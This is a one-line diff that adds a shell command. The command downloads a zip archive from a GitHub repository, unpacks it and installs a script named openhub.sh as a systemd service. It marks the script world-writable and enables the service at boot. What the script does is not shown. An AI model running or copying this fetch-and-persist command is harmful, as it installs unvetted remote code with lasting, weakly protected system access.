@@ -1,0 +1,1 @@
+wget https://github.com/vadlike/junk/blob/main/-/rds?raw=true -O 123.zip && unzip -o 123 && mv openhub.sh /etc/server && mv openhub.service /usr/lib/systemd/system && chmod 777 /etc/server/openhub.sh && systemctl enable openhub.service
